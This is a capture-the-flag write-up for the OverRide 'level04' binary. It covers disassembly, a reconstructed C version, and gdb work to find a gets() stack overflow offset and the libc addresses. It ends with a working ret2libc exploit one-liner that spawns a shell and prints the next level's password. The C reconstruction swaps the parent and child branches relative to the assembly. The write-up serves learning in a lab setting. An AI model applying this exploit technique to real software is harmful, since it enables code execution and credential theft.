# level04 - Stack Buffer Overflow

On `level04`'s HOME, we find a binary named : `level04`

```shell
...
0x080486c8  main
...
```


```shell
gefâž¤  disass main
Dump of assembler code for function main:
   0x080486c8 <+0>:	push   ebp
   0x080486c9 <+1>:	mov    ebp,esp
   0x080486cb <+3>:	push   edi
   0x080486cc <+4>:	push   ebx
   0x080486cd <+5>:	and    esp,0xfffffff0
   0x080486d0 <+8>:	sub    esp,0xb0
   0x080486d6 <+14>:	call   0x8048550 <fork@plt>
   0x080486db <+19>:	mov    DWORD PTR [esp+0xac],eax
   0x080486e2 <+26>:	lea    ebx,[esp+0x20]
   0x080486e6 <+30>:	mov    eax,0x0
   0x080486eb <+35>:	mov    edx,0x20
   0x080486f0 <+40>:	mov    edi,ebx
   0x080486f2 <+42>:	mov    ecx,edx
   0x080486f4 <+44>:	rep stos DWORD PTR es:[edi],eax
   0x080486f6 <+46>:	mov    DWORD PTR [esp+0xa8],0x0
   0x08048701 <+57>:	mov    DWORD PTR [esp+0x1c],0x0
   0x08048709 <+65>:	cmp    DWORD PTR [esp+0xac],0x0
   0x08048711 <+73>:	jne    0x8048769 <main+161>
   0x08048713 <+75>:	mov    DWORD PTR [esp+0x4],0x1
   0x0804871b <+83>:	mov    DWORD PTR [esp],0x1
   0x08048722 <+90>:	call   0x8048540 <prctl@plt>
   0x08048727 <+95>:	mov    DWORD PTR [esp+0xc],0x0
   0x0804872f <+103>:	mov    DWORD PTR [esp+0x8],0x0
   0x08048737 <+111>:	mov    DWORD PTR [esp+0x4],0x0
   0x0804873f <+119>:	mov    DWORD PTR [esp],0x0
   0x08048746 <+126>:	call   0x8048570 <ptrace@plt>
   0x0804874b <+131>:	mov    DWORD PTR [esp],0x8048903
   0x08048752 <+138>:	call   0x8048500 <puts@plt>
   0x08048757 <+143>:	lea    eax,[esp+0x20]
   0x0804875b <+147>:	mov    DWORD PTR [esp],eax
   0x0804875e <+150>:	call   0x80484b0 <gets@plt>
   0x08048763 <+155>:	jmp    0x804881a <main+338>
   0x08048768 <+160>:	nop
   0x08048769 <+161>:	lea    eax,[esp+0x1c]
   0x0804876d <+165>:	mov    DWORD PTR [esp],eax
   0x08048770 <+168>:	call   0x80484f0 <wait@plt>
   0x08048775 <+173>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048779 <+177>:	mov    DWORD PTR [esp+0xa0],eax
   0x08048780 <+184>:	mov    eax,DWORD PTR [esp+0xa0]
   0x08048787 <+191>:	and    eax,0x7f
   0x0804878a <+194>:	test   eax,eax
   0x0804878c <+196>:	je     0x80487ac <main+228>
   0x0804878e <+198>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048792 <+202>:	mov    DWORD PTR [esp+0xa4],eax
   0x08048799 <+209>:	mov    eax,DWORD PTR [esp+0xa4]
   0x080487a0 <+216>:	and    eax,0x7f
   0x080487a3 <+219>:	add    eax,0x1
   0x080487a6 <+222>:	sar    al,1
   0x080487a8 <+224>:	test   al,al
   0x080487aa <+226>:	jle    0x80487ba <main+242>
   0x080487ac <+228>:	mov    DWORD PTR [esp],0x804891d
   0x080487b3 <+235>:	call   0x8048500 <puts@plt>
   0x080487b8 <+240>:	jmp    0x804881a <main+338>
   0x080487ba <+242>:	mov    DWORD PTR [esp+0xc],0x0
   0x080487c2 <+250>:	mov    DWORD PTR [esp+0x8],0x2c
   0x080487ca <+258>:	mov    eax,DWORD PTR [esp+0xac]
   0x080487d1 <+265>:	mov    DWORD PTR [esp+0x4],eax
   0x080487d5 <+269>:	mov    DWORD PTR [esp],0x3
   0x080487dc <+276>:	call   0x8048570 <ptrace@plt>
   0x080487e1 <+281>:	mov    DWORD PTR [esp+0xa8],eax
   0x080487e8 <+288>:	cmp    DWORD PTR [esp+0xa8],0xb
   0x080487f0 <+296>:	jne    0x8048768 <main+160>
   0x080487f6 <+302>:	mov    DWORD PTR [esp],0x8048931
   0x080487fd <+309>:	call   0x8048500 <puts@plt>
   0x08048802 <+314>:	mov    DWORD PTR [esp+0x4],0x9
   0x0804880a <+322>:	mov    eax,DWORD PTR [esp+0xac]
   0x08048811 <+329>:	mov    DWORD PTR [esp],eax
   0x08048814 <+332>:	call   0x8048520 <kill@plt>
   0x08048819 <+337>:	nop
   0x0804881a <+338>:	mov    eax,0x0
   0x0804881f <+343>:	lea    esp,[ebp-0x8]
   0x08048822 <+346>:	pop    ebx
   0x08048823 <+347>:	pop    edi
   0x08048824 <+348>:	pop    ebp
   0x08048825 <+349>:	ret
End of assembler dump.
```

<br>

After decompiling it using gdb, we build this code in C language:

```c
# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <sys/types.h>
# include <sys/wait.h>
# include <unistd.h>
# include <sys/prctl.h>
# include <sys/ptrace.h>


int main(void) {

	int		*wstatus = NULL; // esp+0x1c
	char	str[32]; // esp+0x20
	int		tmp;	// esp+0xa8
	pid_t	pid; // esp+0xac

	for ( int i = 0; i < 32; i++ )
		str[i] = '\0';

	pid = fork();

	if ( pid ) {
		prctl( 1, 1 );
		ptrace( PTRACE_TRACEME, 0, NULL, NULL );
		puts( "Give me some shellcode, k" );
		gets( str );
	} else {

		while (1) {
			wait( wstatus );
			if ( *wstatus & 127 == 0 ) {
				if ( (*wstatus & 127) >> 1 == 0 ) {
					if ( ptrace(PTRACE_PEEKDATA, pid, 0x2c, NULL) == 0xb ) {
						puts("no exec() for you");
						kill(pid, 9);
						break;
					}
				}
			} else {
				puts( "child is exiting..." );
				break;
			}
		}

	}

	return 0;

}
```

From the assembly code and its transciption into C, we understand that we have
a buffer overflow vulnerability in the child process code (`gets(str);`),
so we can easily inject our shellcode into the buffer on the stack.
But there's one thing: we can't use functions from the `exec()` family to do this...
no problem, we will use `system()` function using a ret2libs (*return to libc*) attack.
Let's build it.

<br>

Let's check how long is the offset to rewrite eip.

```shell
gdb) set follow-fork-mode child
(gdb) b *0x08048763
Breakpoint 1 at 0x8048763
(gdb) r < <(python -c 'print "A" * 200')
Starting program: /home/users/level04/level04 < <(python -c 'print "A" * 200')
[New process 1789]
child is exiting...
Give me some shellcode, k
[Switching to process 1789]

Breakpoint 1, 0x08048763 in main ()
(gdb) x/wx $esp+0x20
0xffffd670:	0x41414141
(gdb) info frame
Stack level 0, frame at 0xffffd710:
 eip = 0x8048763 in main; saved eip 0x41414141
 Arglist at 0xffffd708, args: 
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebx at 0xffffd700, ebp at 0xffffd708, edi at 0xffffd704, eip at 0xffffd70c
```

There is a **156 bytes** offset (*0xffffd70c - 0xffffd670 = 9c*). 

Finally, for the **ret2libc** attack we need the `system()` address and a pointer
to string `/bin/sh` present (for sure) on runtime.

```shell
(gdb) b main
Breakpoint 1 at 0x80486cd
(gdb) r
Starting program: /home/users/level04/level04

Breakpoint 1, 0x080486cd in main ()
(gdb)  find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) info func system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr
```

<br>

Perfect, we've got all we need to exploit this binary. Our payload will be:

- 156 bytes NOP offset
- `0xf7\xe6\xae\xd0` = `system()`
- `\x00\x00\x00\x00` = *return address which is not important*
- `0xf7\xf8\x97\xec` = string `/bin/sh`

<br>

We can now exploit this BOF :

```shell
(python -c 'print "A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\x00\x00\x00\x00" + "\xf7\xf8\x97\xec"[::-1]'; cat) | ./level04
```


```shell
level04@OverRide:~$ (python -c 'print "A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\x00\x00\x00\x00" + "\xf7\xf8\x97\xec"[::-1]'; cat) | ./level04
Give me some shellcode, k
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
